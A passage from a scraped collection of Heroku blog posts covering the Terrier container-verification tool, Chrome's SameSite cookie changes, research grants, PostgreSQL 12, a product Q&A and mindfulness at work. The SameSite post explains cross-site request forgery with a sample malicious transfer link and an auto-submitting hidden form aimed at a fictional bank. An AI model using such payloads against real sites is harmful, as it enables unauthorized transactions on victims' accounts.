ps\nCONTAINER ID        IMAGE                    COMMAND               CREATED             STATUS              PORTS               NAMES\nb9e676fd7b09        golang                   \"bash\"                20 hours ago        Up 20 hours                             cocky_robinson Once you have the container’s ID, you can run the following command which will help you identify the location of the container’s merged folder on the underlying host. $ docker exec b9e676fd7b09 mount | grep diff\noverlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/7ZDEFE6PX4C3I3LGIGGI5MWQD4:\n/var/lib/docker/overlay2/l/EZNIFFIXOVO2GIT5PTBI754HC4:/var/lib/docker/overlay2/l/UWKXP76FVZULHGRKZMVYJHY5IK:\n/var/lib/docker/overlay2/l/DTQQUTRXU4ZLLQTMACWMJYNRTH:/var/lib/docker/overlay2/l/R6DE2RY63EJABTON6HVSFRFICC:\n/var/lib/docker/overlay2/l/U4JNTFLQEKMFHVEQJ5BQDLL7NO:/var/lib/docker/overlay2/l/FEBURQY25XGHJNPSFY5EEPCFKA:\n/var/lib/docker/overlay2/l/ICNMAZ44JY5WZQTFMYY4VV6OOZ,\nupperdir=/var/lib/docker/overlay2/04f84ddd30a7df7cd3f8b1edeb4fb89d476ed84cf3f76d367e4ebf22cd1978a4/diff,\nworkdir=/var/lib/docker/overlay2/04f84ddd30a7df7cd3f8b1edeb4fb89d476ed84cf3f76d367e4ebf22cd1978a4/work) From the results above, we are interested in two entries, upperdir and workdir because these two entries will provide us with the path to the container’s merged folder. From the results above, we can determine that the container’s merged directory is located at /var/lib/docker/overlay2/04f84ddd30a7df7cd3f8b1edeb4fb89d476ed84cf3f76d367e4ebf22cd1978a4/ on the underlying host. Now that we have the location, we need some files to identify and in this case, we are going to reuse the SHA256 hashes from the previous section. Let’s now go ahead and populate our Terrier configuration with this new information. mode: container\npath: merged\n#image: myImage.tar\n\nhashes:\n    - hash: '82bce4b98d7aaeb4f841a36f7141d540bb049f89219f9e377245a91dd3ff92dd'\n    - hash: 'cf734865dd344cd9b0b349cdcecd83f79a751150b5fd4926f976adddb93d902c' The configuration above shows that we have changed the mode from image to container and we have added the path to our merged folder. We have kept the two hashes from the previous section. If we run Terrier with this configuration from the location /var/lib/docker/overlay2/04f84ddd30a7df7cd3f8b1edeb4fb89d476ed84cf3f76d367e4ebf22cd1978a4/ , we get the following output: $ ./terrier\n[+] Loading config: cfg.yml\n[+] Analysing Container\n[!] Found matching instance of '82bce4b98d7aaeb4f841a36f7141d540bb049f89219f9e377245a91dd3ff92dd' at: merged/usr/local/go/bin/go with hash:82bce4b98d7aaeb4f841a36f7141d540bb049f89219f9e377245a91dd3ff92dd From the output above, we know that the container ( b9e676fd7b09 ) does not contain the malicious Python package but it does contain an instance of the Golang binary which is located at merged/usr/local/go/bin/go . Identifying and verifying specific files in containers And as you might have guessed, Terrier can also be used to verify and identify files at specific paths in containers. To do this, we need the following: Location of the container’s merged folder A SHA256 hash of a specific file/s The path and name of the specific file/s The points above can be determined using the same procedures described in the previous sections. Below is an example Terrier config file that we could use to identify and verify components in a running container: mode: container\npath: merged\nverbose: true\nfiles:\n  - name: '/usr/bin/curl'\n    hashes:\n      - hash: '9a43cb726fef31f272333b236ff1fde4beab363af54d0bc99c304450065d9c96'\n  - name: '/usr/local/go/bin/go'\n    hashes:\n      - hash: '82bce4b98d7aaeb4f841a36f7141d540bb049f89219f9e377245a91dd3ff92dd' If we run Terrier with the above config, we get the following output: $ ./terrier\n[+] Loading config: cfg.yml\n[+] Analysing Container\n[!] Found matching instance of '/usr/bin/curl' at: merged/usr/bin/curl with hash:9a43cb726fef31f272333b236ff1fde4beab363af54d0bc99c304450065d9c96\n[!] Found matching instance of '/usr/local/go/bin/go' at: merged/usr/local/go/bin/go with hash:82bce4b98d7aaeb4f841a36f7141d540bb049f89219f9e377245a91\ndd3ff92dd\n[!] All components were identified: (2/2)\n[!] All components were identified and verified: (2/2)\n$ echo $?\n0 From the output above, we can see that Terrier was able to successfully identify and verify all the files in the running container. The return code is also 0 which indicates a successful execution of Terrier. Using Terrier with CI/CD In addition to Terrier being used as a standalone CLI tool, Terrier can also be integrated easily with existing CI/CD technologies such as GitHub Actions and CircleCI. Below are two example configurations that show how Terrier can be used to identify and verify certain components of Docker files in a pipeline and prevent the pipeline from continuing if all verifications do not pass. This can be seen as an extra mitigation for supply-chain attacks. Below is a CircleCI example configuration using Terrier to verify the contents of an image. version: 2\njobs:\nbuild:\n  machine: true\n  steps:\n    - checkout\n    - run:\n       name: Build Docker Image\n       command: |\n             docker build -t builditall .\n    - run:\n       name: Save Docker Image Locally\n       command: |\n             docker save builditall -o builditall.tar\n    - run:\n       name: Verify Docker Image Binaries\n       command: |\n             ./terrier Below is a Github Actions example configuration using Terrier to verify the contents of an image. name: Go\non: [push]\njobs:\nbuild:\n  name: Build\n  runs-on: ubuntu-latest\n  steps:\n\n  - name: Get Code\n    uses: actions/checkout@master\n  - name: Build Docker Image\n    run: |\n      docker build -t builditall .\n  - name: Save Docker Image Locally\n    run: |\n      docker save builditall -o builditall.tar\n  - name: Verify Docker Image Binaries\n    run: |\n      ./terrier Conclusion In this blog post, we have looked at how to perform multiple actions on Docker (and OCI) containers and images via Terrier. The actions performed allowed us to identify specific files according to their hashes in images and containers. The actions performed have also allowed us to identify and verify multiple components in images and containers. These actions performed by Terrier are useful when attempting to prevent certain supply-chain attacks. We have also seen how Terrier can be used in a DevOps pipeline via GitHub Actions and CircleCI. Learn more about Terrier on GitHub at https://github.com/heroku/terrier . devops OCI Docker containers open source", "date": "2020-01-14,"},
{"website": "Heroku", "title": "Chrome's Changes Could Break Your App: Prepare for SameSite Cookie Updates", "author": ["Lenora Porter"], "link": "https://blog.heroku.com/chrome-changes-samesite-cookie", "abstract": "Chrome's Changes Could Break Your App: Prepare for SameSite Cookie Updates Posted by Lenora Porter February 03, 2020 Listen to this article In this post, we will cover changes coming to Chrome (and other browsers) that affect how third-party cookies are handled—specifically SameSite changes, how to test to see if your site is impacted and how to fix it. ⚓️ What is SameSite and why the big change? ⚓️ Prepare for Chrome 80 updates ⚓️ Step 1: Enabling SameSite Chrome flags and test to see if your site faces SameSite errors ⚓️ Step 2: Fixing cookie errors using appropriate attributes What is SameSite and why the big change? Back in May 2019, Chrome announced its plan to develop a secure-by-default model for handling cookies. This initiative highlights Chrome’s promise of a more secure and faster browsing experience. Chrome's goal is to increase transparency, choice and control. Users should be aware of how they are tracked, who is tracking them, and ways to control the information shared. With the influx of privacy concerns and potential cross-site attacks, Chrome is taking action to protect its users. These changes will dramatically impact advertisers, publishers, or any company relying on cookies to target their audience. Be sure to prepare in advance so your users won't experience disruptions. Now, the day is finally at hand. Starting February 4, 2020, Google Chrome will stop sending third-party cookies in cross-site requests unless the cookies are secured and flagged using an IETF standard called SameSite . What does this mean? What are third-party cookies? What are cross-site request? When you visit a website, a browser cookie is generated and saved inside a folder in your web browser. This browser cookie is then used as a way to identify you and provide a personalized browsing experience. There are two types of cookies — first-party and third-party. Both types can hold the same information; however, they are accessed and created differently. As illustrated above, if you visit website a.com and you attempt to access a service from the same domain name a.com ,  cookies generated will be considered first-party cookies. Being that the cookies were created by the same site, you'll be able to enjoy same-site luxuries while visiting a.com 's web service. These luxuries include saved login information, shopping cart items, site preferences, etc. Whereas, if you visit a website a.com but that page includes content (image, iframe, etc.) from a different domain name b.com , cookies set by b.com will be considered third-party cookies because they come from a different name than in the URL bar: a.com . These cookies were created by a different site and b.com accessing them from a.com (or any other domain) would constitute a cross-site request. A page on a.com making requests to b.com (for images, iframes, etc.) is what allows services like Facebook, Google Analytics, Doubleclick, etc. to track users and provide online-advertisements. In that example, Facebook, Google, and Doubleclick are the b.com . This allows, for example, Doubleclick to show targeted ads to you on multiple other sites you visit, like a news site, a hotel site, or a blog you read. As previously stated, Google Chrome will stop sending third-party cookies in cross-site requests unless the cookies are secured and flagged using an IETF standard called SameSite . In other words, the content from b.com (images, iframe, etc.) on a.com ’s page will no longer be able to access b.com 's cookies unless those cookies are secured and flagged appropriately. Why is Google making such a huge change? Sharing cross-site cookies is not always an issue; however, it has the potential for abuse. Google Chrome's current behavior allows third-party websites to access all cookies by default.  This creates the possibility of cross-site request forgery (CSRF) attacks, other security vulnerabilities and privacy leaks. What’s cross-site request forgery (CSRF)? Cross-site request forgery is a web security vulnerability that allows a hacker to exploit users through session surfing or one-click attacks. For example, hackers can trick an innocent user to click a believable link. If this user is already logged into a website the hacker wants to access, the hacker can surf on the already authenticated session and make request to a site the user didn't intend to make. Being that the user already authenticated, the site cannot distinguish between the forged or legitimate request. There are a few ways to create these malicious commands: image tags, link tags, hidden forms, and JavaScript XMLHttpRequests. With Chrome's current default behavior, the requested cookie will be sent by default, and the hacker will have access to the user's session, which means they are effectively logged in as the user. To fight against this web vulnerability, web frameworks often require unique tokens/identifiers that are not accessible to attackers and would not be sent along (like cookies) with requests. As an example, let’s assume you sign into your bank account. www.bankpal.com While browsing your transaction history, you get an email letting you know about a recent suspicious transaction. To investigate further, the email requires you to log into your bank account. It provides a convenient link for you as well. 💡Note: You are still logged in to BankPal in another tab. The link’s HTML is as follows: <a href=\"http://www.bank.com/transfer?acct=888888&amount=100000\">Log In</a> The hacker has already studied BankPal so they know how to mimic account transfers quite well. For example, here is how BankPal typically creates money transfers: GET http://www.bankpal.com/transfer?acct=AccountId&amount=DollarAmount HTTP/1.1 This hacker has sent this email to a large number of bank customers and they know at least one person will click this believable link. You are that one customer. From a quick glance, this email looks legitimate. There is no way it could be suspicious and cause harm to a user's account. It even has the BankPal logo! With full trust, you click the link. Since you are already authenticated in the previous tab, clicking that link ends up creating an unauthorized transaction behind the scenes. This attacker has forged your identity, transferred $100,000 from your account, and has completely ruined your life (or at least your bank account) in seconds. Let's say BankPal only allows a POST request for money transfers. It would be impossible to create a malicious request using an <a href> tag. This attacker could very well create a <form> tag instead with automatic execution of the embedded JavaScript. This form's HTML code could look like this: <body onload=\"document.forms[0].submit()\">\n   <form action=\"http://www.bankpal.com/transfer\" method=\"POST\">\n     <input type=\"hidden\" name=\"acct\" value=\"AttackerAccountId\"/>\n     <input type=\"hidden\" name=\"amount\" value=\"100000\"/>\n     <input type=\"submit\" value=\"Log In\"/>\n   </form>\n </body> In a real-life scenario, the example above would not happen. Banks prevent CSRF attacks using dynamically generated session tokens, session timeouts and other preventive methods. And now, with the SameSite attribute Strict (read more below), banks have yet another preventive measure. Large companies have found methods of protection; however, there are lots of smaller websites without protection. If an attacker can forge a transaction, they can also forge a password reset request, an email change request, and then gain full control of an account or web application. How is Chrome protecting users against CSRF attacks? To alleviate this issue, Chrome version 51 (2016-05-25) introduced the concept of the SameSite attribute. With the SameSite attribute, website developers have the power to set rules around how cookies are shared and accessed. The SameSite attribute can be set with the following values: Strict , Lax , or None . Strict: Restricts cross-site sharing altogether. Cookies with this setting can be accessed only when visiting the domain from which it was initially set. In other words, Strict completely blocks a cookie being sent to a.com when a page from b.com makes the request. Even when clicking a top-level link on a third-party domain to your site, the browser will refuse to send the cookie. This option would be best for applications that require high security, such as banks. Lax: All the sites belonging to the same domain can set and access cookies. Unlike None where cookies are always sent, Lax cookies are only sent on same-site request like Strict . However, Lax allows top-level (sometimes called public suffix ) navigation access with a safe HTTP method, like HTTP GET . The cookie will not be sent with cross-domain POST requests or when loading the site in a cross-origin frame, but it will be sent when you navigate to the site via a standard top-level <a href=...> link. None: Allows third-party cookies to track users across sites. Cookies with this setting will work the same way as cookies work today. Cookies will be able to be used across sites. \n💡Note that you need both the None and Secure attributes together. If you just specify None without Secure the cookie will be rejected. Secure ensures that the browser request is sent by a secure (HTTPS) connection. Real-world example of the difference between Strict and Lax The None attribute is pretty understandable; however, there seems to be confusion around Strict and Lax . Let's dive into a real-world example. Let's say you are the CEO of TalkToMe, Inc., a feature rich commenting system. You allow your users to embed TalkToMe on their websites and they gain social network integration, advanced moderation options and other extensive community functions. If TalkToMe, Inc.'s first-party cookies are set to Lax , your customers are still able to access their embedded comments. If TalkToMe, Inc.'s first-party cookies are set to Strict , your customers will not be able to access data from an external site. Chrome 80 SameSite update With the Chrome 51 update, Google gave website developers power to set rules around how cookies are shared; however, many developers don't follow the recommended practice. Instead of leaving the user's cookies exposed to potential security vulnerabilities (allowing third-party requests by default), the Chrome 80 update takes the power back and sets all cookies to SameSite=Lax by default. In other words, Chrome has decided to make all cookies limited to first-party context by default, and will require developers to mark a cookie as needing third-party visibility using SameSite=None explicitly. “We’ve been focused on giving users transparency and choice over how they are tracked on the web through easy to use controls.” - Ben Galbraith, Director, Chrome Product Management Will this change break anything? This SameSite update requires explicit labeling for third-party cookies. Cookies that aren’t labeled appropriately may cease to function in Chrome. Even more than that: all cookies previously set may no longer be accessible. How many users will this change affect? According to the online traffic monitor StatCounter , Chrome is the most popular web browser, and this change will affect 64% of the world’s internet users in 2020. Keep reading to find out how you can keep this change from affecting your users! Will my website be affected? If either of the following is true, you will be affected and you must update your cookies: If your website integrates with external services for advertising, content recommendations, third-party widgets, social media embeds, or any custom integration that relies on cookies If your website uses non-secure (HTTP rather than HTTPS) browser access Prepare for Chrome 80 updates Step 1: Enabling SameSite Chrome flags and test to see if your site faces potential SameSite errors As of Chrome 76, you can enable the new #same-site-by-default-cookies flag and test your site before the February 4, 2020 deadline. Let's enable the flag: Go to chrome://flags/ Enable #same-site-by-default-cookies and #cookies-without-same-site-must-be-secure Restart the browser for the changes to take effect. Visit your website and see if you can spot error messages in the console of your browser's dev tools. If you see error messages like the one above, this means your site is not ready for the 2020 Chrome 80 release. You should continue reading to learn how to set your cookies. Step 2: Fixing cookie errors using appropriate attributes Common use cases: Auditing your cookie usage Chrome , Firefox , Edge , and other browsers will also change their default cookie behavior to the following: Cookies without a SameSite attribute will be treated as SameSite=Lax (See variants below), meaning all cookies will be restricted to first-party context only. If you need third-party access, you will need to update your cookies. Cookies needing third-party access must specify SameSite=None; Secure to enable access. If you don't know whether you provide cookies that are intended for cross-site usage, some common use-cases are You present ads on your website. You present content in an <iframe> . You present content within a WebView. You present images from another site on your website. You embed content shared from other sites, such as videos, maps, code samples, chat widgets and social post. You use third-party services on your website like Facebook, Twitter, Instagram, LinkedIn, Gravatar, Google Calendar, User Tracking (CrazyEgg, Google Analytics, etc.), CRM and/or reservations, booking, anti-fraud and payments services. 💡 NOTE:\nCookie warnings triggered from domains you don't control will need to be set appropriately by the domain owner. If you are getting a warning like this from Google, Google will have to set this cookie appropriately. If the warning messages list a domain you control, you will need to add the correct attributes. (index):1 A cookie associated with a resource at http://google.com/ was set with \nSameSite=None but without Secure. A future release of Chrome will only deliver \ncookies marked SameSite=None if they are also marked Secure. You can review cookies\n in developer tools under Application>Storage>Cookies and see more details at \n https://www.chromestatus.com/feature/5633521622188032. Knowing which attribute to use First, a quick recap of SameSite attributes: Value Description Strict Cookies with this setting can be accessed only when visiting the domain from which it was initially set. In other words, Strict completely blocks a cookie being sent to a.com when it is being sent from a page on b.com (i.e. b.com is in the URL bar). Even when clicking a top-level link on a third-party domain to your site, the browser will refuse to send the cookie. This option would be best for applications that require high security, such as banks. Lax Unlike None where cookies are always sent, Lax cookies are only sent on same-site request like Strict . However, Lax allows top-level navigation access with a safe HTTP method, like HTTP GET . The cookie will not be sent with cross-domain POST requests or when loading the site in a cross-origin frame, but it will be sent when you navigate to the site via a standard top-level <a href=...> link. None Cookies with this setting will work the same way as cookies work today. Cookies will be able to be used across sites. 💡Note that you need both the None and Secure attributes together. If you just specify None without Secure the cookie will be rejected. Secure ensures that the browser request is sent by a secure (HTTPS) connection. 🍪 When to use SameSite=Strict Use when the domain in the URL bar equals the cookie’s domain (first-party) AND the link isn’t coming from a third-party. Set-Cookie: first_party_var=value; SameSite=Strict 🍪 When to use SameSite=Lax Use when the domain in the URL bar equals the cookie’s domain (first-party). Note: Third party content (images, iframes, etc.) is allowed. Set-Cookie: first_party_var=value; SameSite=Lax 🍪 When to use SameSite=None; Secure Use when you don't need cross-domain limitations. Set-Cookie: third_party_var=value; SameSite=None; Secure Common scenarios When to... Scenario Attribute If you do nothing Use SameSite=Strict Your website offers banking services or your website needs a very secure environment Update your SameSite attribute to SameSite=Strict to add a layer of protection from web threats. Your site may be susceptible to potential web vulnerabilities and data leaks. Use SameSite=Lax You have a social community website and you offer embedded chat widgets Update your SameSite attribute to SameSite=Lax You'll be good to go. Chrome's default behavior will be SameSite=Lax . Even if SameSite is not set, the default is still SameSite=Lax Use SameSite=None Your website offers data analytics services OR your website offers retargeting, advertising and conversion tracking. Update your SameSite attribute to SameSite=None; Secure to ensure Chrome doesn't reject your third-party cookies. Your cookies will no longer work on Feb 4, 2020. \"Speak to a representative\" You've monetized your website with third-party ad programs OR you're utilizing third-party services like Google Calendar, Cloudflare, Facebook, Twitter, Instagram, LinkedIn, Gravatar, User Tracking services, CRM, reservations plugin, anti-fraud, third-party fonts, image/video hosting and/or payments services. Speak with the ad program company to ensure they have a plan to update their cookies. You can't update cookies on a domain you don't control. You may see a decline in the ad revenue you receive and or business engagement. Now, set your cookies Most server-side applications support SameSite attributes; however, there are a few clients who don't support it (see Known Incompatible Clients ). For Server-Side Applications : Support for SameSite=None in languages, libraries, and frameworks PHP NodeJS Python Python Flask Ruby on Rails Recent pull request: https://github.com/rails/rails/pull/28297 Directly : document.cookie JavaScript Need more help? Rowan Merewood, Developer Advocate for Chrome, listed a few helpful ways to get help with setting cookies. Keep in mind, this will be a new update so if you run into an issue, it may be the first time anyone has encountered the issue. It is best to just raise the issue, be vocal, and publicly address your concerns because someone else is very likely to encounter the same issue! Raise an issue on the SameSite examples repo on GitHub . Post a question on the \"samesite\" tag on StackOverflow . For issues with Chromium's behavior, raise a bug via the [ SameSite cookies] issue template . Follow Chrome's progress on the SameSite updates page .", "date": "2020-02-03,"},
{"website": "Heroku", "title": "Using Research Grants to Foster Innovation", "author": ["Joe Kutner"], "link": "https://blog.heroku.com/research-grants", "abstract": "Using Research Grants to Foster Innovation Posted by Joe Kutner February 12, 2020 Listen to this article As CEO of Disney, Michael Eisner had a policy that any employee could come to his office and pitch an idea . He believed that breaking down hierarchical barriers allowed innovative ideas to come from anywhere, and it worked. Disney invested in many of those pitches, some of which became the kernels for films like The Little Mermaid and Pocahontas . At Heroku, we know our employees are full of innovative ideas waiting for investment. That’s why any engineer can propose a project through a process we call Research Grants. If the proposal is funded, that engineer gets about two weeks to experiment with their idea and create a work product that can lead to innovative new technologies or even turn into a Heroku feature. The Research Grants program has been in place for more than a year, but it's really the formalization of an ad hoc process that’s been a part of our Heroku culture since the early days. In the last year we've seen a wealth of innovation powering new products , modernizing our infrastructure , eliminating friction for our users, and reducing our cost-to-serve. Here's how it works. One little spark Research Grants usually start with a problem. Sometimes it's an engineer's own itch or a rough spot customers repeatedly stumble into. When smart people encounter one of these problems they tend to think of very clever ways to solve them. All we need to do as a company is give them a path they can follow to turn the idea into a reality. Once the idea has been formulated, the engineer drafts a Research Grant proposal using a simple template. The template is meant to roughly imitate the scientific method, and has three parts: Question(s) - these are what we’re hoping to answer as part of the research Prediction - a hypothesis; what we expect the results to show Procedure - how the work will be conducted, how long it will take, and what artifacts will be delivered The questions stem from the problem the research is hoping to solve. For example, \"can we reduce costs by reusing dynos in our tests?\" or \" can we use open source frameworks as a platform for functions-as-a-service? \" or \" can we use static typing in Ruby? \" Once written, a proposal is submitted to a Research Grant Oversight Committee for review. The committee takes different shapes in each department, but is always a cross-sectional representation of leadership including architecture, management, and product. The committee evaluates the merits of the proposal, and decides to accept or reject it. The review process is important for two reasons. First, it ensures that the idea is valuable to the business--Research Grants aren't meant to support wild tangents from our core mission. Second, they create an environment of institutionalized creative friction , which was another one of Eisner's values. He believed good ideas come from supportive conflict, which requires some amount of friction. If an idea needs more thought, the committee will tell the engineer who proposed it. It’s the only way they'll be able to improve the proposal or do better next time. After the funding period, the researcher usually delivers a report and sometimes a prototype. This creates a strong foundation from which the idea can grow towards a prioritized project that an entire team could work on. Because the product owners and engineering managers have been involved from the outset, we don’t need to resell the idea. The stakeholders are already invested. A whole new world Research Grants allow ideas to work their way from the bottom up while adding value to the business. This is an important characteristic because it corrects some of the mistakes made by other programs designed to encourage innovation. Google's defunct 80/20 policy and similar programs allow engineers to experiment at their own discretion. Some great ideas and technologies have come out of these programs, but they lack a strong connection to the business. As a result, they are often reduced to a perk, rather than a tool for driving innovation the company can benefit from. A Research Grant's focus on business value is important to the engineer doing the research as well. When you take advantage of a perk like Google’s 80/20 policy, the cool Uber-for-cats app you made won't help you get that raise or promotion. But when a Research Grant is successful, it will look excellent in your portfolio. Research Grants also provide constraints that 80/20 cannot. If people work on a blank canvas with no rules, they tend to think too much or never finish what they've started because the scope can quickly become too big. Research Grants create a clear timebox and a goal that engineers can work toward because the system forces them to define those upfront. Be our guest We'd love to see other organizations copy or borrow the Research Grant model. If you want to get started quickly you can fork our template GitHub repository . We use Git to facilitate our proposal and review process, which makes the program very developer-oriented (like most things at Heroku). If you give Research Grants a try, reach out and let us know how it goes, what you learned, and what you would change. If you have questions or feedback, open an issue on the GitHub template . metastrategy research grants", "date": "2020-02-12,"},
{"website": "Heroku", "title": "PostgreSQL 12 Generally Available on Heroku", "author": ["Scott Truitt"], "link": "https://blog.heroku.com/posgtresql-12", "abstract": "PostgreSQL 12 Generally Available on Heroku Posted by Scott Truitt February 04, 2020 Listen to this article After a successful evaluation period, PostgreSQL 12 is now the default version for new Heroku Postgres databases and an available upgrade for existing databases. I want to emphasize a few key changes and improvements in Postgres 12: Native Table Partitioning Concurrent Operations Native Partitioning was introduced in PostgreSQL 10 and performance improvements for improved parallel processing were added in PostgreSQL 11. Updating tables, altering partitions blocking queries, and executing concurrent operations for Native Partitioning were all improved in PostgreSQL 12. New features include allowing tables to modify partitions without blocking queries, allowing foreign keys to reference partitioned tables, and adding introspection functions to understand partitioned tables through their lifecycle. Reduced Overhead for Indexing Indexing is a crucial performance component of PostgreSQL, so we are excited to see PostgreSQL add REINDEX CONCURRENTLY options for all indexes that no longer block writes to tables. When users need to alter their indexing structures, pg_stat_progress_create_index progress function shows CREATE and REINDEX operations progress. For customers using full-text searching or natural clustered data indexing, PostgreSQL 12 writes less information to the Write-Ahead Logs during index creation. GiST, GIN, and SP-GiST indexes have been updated to require less WAL and disk overhead usage during their creation. Additionally, VACUUM operations for these indexes were hardened to clean up more space as data changes in the underlying tables occur, maintaining performance and reducing space costs for your PostgreSQL database. Generated Columns In some cases, column data may be helpful during relational or informational operations. With space being the chief commodity in databases, we are excited for the introduction of Generated Columns to PostgreSQL 12. This enables columns to be computed from other columns when read and can be utilized similar to materialized views using the STORED keyword. There are a few limitations to consider when examining this new feature, so please be sure to read the new documentation to find new ways to optimize and save space on your database. Non-Backward compatible items removed There are some breaking changes introduced into PostgreSQL. Please make sure your database is capable of migrating to supported features before attempting to upgrade to PostgreSQL 12. Removed data types: abstime reltime tinterval Extensions dropped: timetravel Note the changes made to CTE materialization too. Get Started Today If you want to try out the new version, provision a new database: $ heroku addons:create heroku-postgresql -a sushi\n\n$ heroku pg:info DATABASE_URL -a sushi\n=== DATABASE_URL\nPlan:                  Hobby-dev\nStatus:                Available\n...\nPG Version:            12.0\n... For further details about other new features in PostgreSQL 12, please see the PostgreSQL documentation . Let us know what you think at postgres@heroku.com . data services managed database Postgres12 heroku postgres", "date": "2020-02-04,"},
{"website": "Heroku", "title": "Join us for a Live Q&A Chat with Salesforce Product Managers", "author": ["Wade Wegner"], "link": "https://blog.heroku.com/salesforce-platform-q-and-a", "abstract": "Join us for a Live Q&A Chat with Salesforce Product Managers Posted by Wade Wegner February 19, 2020 Listen to this article Wade Wegner is SVP of Product for Salesforce Platform. On a recent and all-too-short trip to London, I was humbled to have developers in the community spend time with me and other product managers at the UK Salesforce Tower. Building on the massively popular open dialogue with developers that we initiated at Dreamforce last year, our discussion was a transparent conversation with developers who have been building on the Salesforce platform. I was incredibly inspired by the developers local to the London office who spent time after their work day to engage in meaningful conversation about what they wanted to see for the future of the platform, as well as answer questions about tooling and resourcing that they hadn’t yet received answers for. That’s why I’m extremely excited to gather key product managers on my team for an online continuation of the conversation. We will be conducting a live Q&A via Twitter on Thursday, February 20 from 9:30 am – 10:30 am Pacific . On hand to answer your questions will be a collection of Salesforce Platform Product Managers, including some who work on Heroku: Dennis Kromhout van der Meer, Evergreen and Heroku Jon Byrum, Evergreen and Heroku Martie Burris, @MartieBurris , Elements Marketplace and Ecosystem Nahid Samsami, @nahidis , Heroku Developer Interfaces & Ecosystem Noelle Saldana, @noellesio , Product Analytics Trey Ford, @treyford , Platform Trust And some who work on other areas of the Salesforce Platform: Alessandro Yamhure, Employee Experience Andrew Fawcett, @andyinthecloud , Compute Asavari Tayal, @tayalasavari , Functions Assaf Ben-Gur, @assafbengur , Shield and Platform Apps Becky Jaimes, @theebecky , Evergreen Chris Peterson, @ca_peterson , Apex Claire Bianchi, @ClaireSFDX , CLI + Web Tools Dileep Burki, @burki_db , Packaging Jari Salomaa, @salomaa , Big Objects, Async SOQL, Field History Tracking, Field Audit Trail John Vogt, API hub John Whelan, @jwhelan , Shield Platform Encryption, Security Command Center Josh Alexander, @toopherjosh , Strategy Karen Fidelak, @karenfidelak , Release Management, Metadata/Tooling APIs, Change Sets Kevin Vranes, @KevinVranes , Sustainability Cloud Nathan Totten, @ntotten , Developer Tools Rohit Mehta, @rohitforce , Sandbox, Scratch Orgs, Data Mask Stephanie Maddox, @stephaniemaddox , VS Code/Debugging Tools Trevor Scott, @tm_scott , Event Monitoring Tuhin Kumar, @tuhink , Shield Platform Encryption, Shield EM Threat Detection Submit your questions ahead of time to @SalesforceDevs and use the hashtag #TalkDX or #SFDevChat now through February 20, 2020⁠. Or follow along on Twitter to learn more about the Salesforce Platform products outside of Heroku! Cross-posted from the Salesforce Developer blog . product developers platform qanda", "date": "2020-02-19,"},
{"website": "Heroku", "title": "Bringing Mindfulness to Work", "author": ["Francis Lacoste"], "link": "https://blog.heroku.com/bringing-mindfulness-to-work", "abstract": "Bringing Mindfulness to Work Posted by Francis Lacoste March 02, 2020 Listen to this article Meditation, like the foundations of software, is built on top of a binary state: an inhale and an exhale, a breath in and a breath out, a one and a zero. We often believe that to engage in meditation, we need to place ourselves in a room of absolute silence, to dress in comfortable linens, and to be utterly still and alone. But this image could not be further from the truth! To meditate is to foster mindfulness, and presence is an activity that can be performed anywhere, and with others—even at work. Learning how to be mindful amongst others The Search Inside Yourself Leadership Institute —or SIYLI—is a globally recognized nonprofit that works towards making the development of leadership and emotional intelligence more accessible. It achieves this primarily by running public workshops or bringing them within organizations. The workshops emphasize mindfulness as the foundation of self-awareness and emotional intelligence, both qualities essential to effective leadership. Although it draws on Buddhist traditions, the actual practice itself is secularized, composed of exercises to build a bridge between science and contemplative wisdom. I am the Chief of Staff on the Engineering team here at Heroku, and after attending one of SIYLI's gatherings, I was convinced that employees at Heroku would appreciate the lessons they offered. I felt that their program could give us tools to navigate with resilience the conflicts and stress inherent in modern work life. There was just one slight problem: SIYLI conducts its courses over two days, in a face-to-face environment, while Heroku is a remote company with employees distributed unevenly across the globe. Work happens through video chat, and there wasn't a meeting room for SIYLI to gather everyone into. I needed to figure out how to adapt SIYLI's physical-space model for Heroku's unique culture. Establishing a virtual program We partnered with SIYLI to establish a virtual version of their program. The content would stay similar. The biggest change comes in its delivery. SIYLI's original program is very intensive, and if it were just moved online, no one would want to sit in a video call for eight hours. Instead, they rebuilt the program as six two-hour sessions over the course of two weeks. By using the Zoom online platform, they could maintain the essential sense of interactivity, with multiple breakouts for participants to practice what they're learning in smaller groups. Most of the work-related mindfulness programs focus on wellbeing and stress-reduction. What I appreciated about the SIYLI was that it went beyond these aspects to transform how we show up and interact at work. In particular, the program offers a way to relate differently to conflict. In a work environment, there are always conflicts, perhaps between teams dependent on one another, or disagreements on the priorities of features. In a distributed office, it becomes easy to avoid entering conflict (or to ignore it) because there's no one present in your physical space. However, this only hides the conflict; it doesn't solve it. I believe that, culturally and socially, most of us have never been taught how to deal with conflict, which is all about learning how to interact better with people. Heroku's program takes a look at not just verbal interactions, but ones over text, where the opportunity for misunderstandings are much higher, due to lack of vocal nuance and physical clues. The benefits of mindfulness These mindfulness techniques aren't just designed to make people better employees. The skills extend to one's personal life at home, too. This is, of course, another area full of tensions and conflict; in fact, we should expect that every part of our regular lives will have these \"negative\" situations. To support these practices on an ongoing basis, we formed a Mindfulness Guild. (Guilds are an organizational pattern where groups independently self-organize around topics across the organization, with discussions occurring at various points throughout the week, due to different time zones.) In the Mindfulness Guild, we practice a bit together, and we share how the practices are going, challenges we're facing, or successes we’ve had. It's become like a support group for people interested in applying meditation to their life. Participants in Heroku's program have taken note of the transformation that occurred within them. They've assessed that even during hard and painful situations, rather than immediately freaking out, they're able to control their reactions and respond to them in constructive and positive ways. Getting started Are you interested in learning more about SIYLI and Heroku's adaptation? Our podcast, Code[ish], has an episode titled Mindfulness at Work , which contains my full interview with Raúl Barroso. The Responsive Meditation Guide is an open source guide to assist practitioners in their mindfulness journey. culture wellbeing mindfulness", "date": "2020-03-02,"},
